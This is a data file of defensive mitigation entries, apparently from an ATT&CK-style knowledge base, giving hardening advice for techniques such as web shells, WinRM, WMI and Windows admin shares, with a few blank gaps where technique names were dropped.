Valid Accounts Mitigation,"Take measures to detect or prevent techniques such as  or installation of keyloggers to acquire credentials through . Limit credential overlap across systems to prevent access if account credentials are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled and use of accounts is segmented, as this is often equivalent to having a local administrator account with the same password on all systems. 

Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers. (Citation: Microsoft Securing Privileged Access) 

Audit domain and local accounts as well as their permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account. (Citation: TechNet Credential Theft) (Citation: TechNet Least Privilege) These audits should also include if default accounts have been enabled, or if new local accounts are created that have not be authorized. 

Applications and appliances that utilize default username and password should be changed immediately after the installation, and before deployment to a production environment. (Citation: US-CERT Alert TA13-175A Risks of Default Passwords on the Internet) When possible, applications that use SSH keys should be updated periodically and properly secured. ",course_of_action
Video Capture Mitigation,"Mitigating this technique specifically may be difficult as it requires fine-grained API control. Efforts should be focused on preventing unwanted or unknown code from executing on a system.

Identify and block potentially malicious software that may be used to capture video and images by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",course_of_action
Vulnerability Scanning,Vulnerability scanning is used to find potentially exploitable software vulnerabilities to remediate them.,course_of_action
Web Service Mitigation,"Firewalls and Web proxies can be used to enforce external network communication policy. It may be difficult for an organization to block particular services because so many of them are commonly used during the course of business.

Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol or encoded commands used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools. (Citation: University of Birmingham C2)",course_of_action
Web Shell Mitigation,"Ensure that externally facing Web servers are patched regularly to prevent adversary access through  to gain remote code access or through file inclusion weaknesses that may allow adversaries to upload files or scripts that are automatically served as Web pages. 

Audit account and group permissions to ensure that accounts used to manage servers do not overlap with accounts and permissions of users in the internal network that could be acquired through Credential Access and used to log into the Web server and plant a Web shell or pivot from the Web server into the internal network. (Citation: US-CERT Alert TA15-314A Web Shells)",course_of_action
Windows Admin Shares Mitigation,"Do not reuse local administrator account passwords across systems. Ensure password complexity and uniqueness such that the passwords cannot be cracked or guessed. Deny remote use of local admin credentials to log into systems. Do not allow domain user accounts to be in the local Administrators group multiple systems.

Identify unnecessary system utilities or potentially malicious software that may be used to leverage SMB and the Windows admin shares, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",course_of_action
Windows Management Instrumentation Event Subscription Mitigation,"Disabling WMI services may cause system instability and should be evaluated to assess the impact to a network. By default, only administrators are allowed to connect remotely using WMI; restrict other users that are allowed to connect, or disallow all users from connecting remotely to WMI. Prevent credential overlap across systems of administrator and privileged accounts. (Citation: FireEye WMI 2015)",course_of_action
Windows Remote Management Mitigation,"Disable the WinRM service. If the service is necessary, lock down critical enclaves with separate WinRM infrastructure, accounts, and permissions. Follow WinRM best practices on configuration of authentication methods and use of host firewalls to restrict WinRM access to allow communication only to/from specific devices. (Citation: NSA Spotting)",course_of_action
Winlogon Helper DLL Mitigation,"Limit the privileges of user accounts so that only authorized administrators can perform Winlogon helper changes.

Identify and block potentially malicious software that may be executed through the Winlogon helper process by using whitelisting (Citation: Beechey 2010) tools like AppLocker (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) that are capable of auditing and/or blocking unknown DLLs.",course_of_action
XSL Script Processing Mitigation,"and/or msxsl.exe may or may not be used within a given environment. Disabling WMI may cause system instability and should be evaluated to assess the impact to a network. If msxsl.exe is unnecessary, then block its execution to prevent abuse by adversaries.",course_of_action
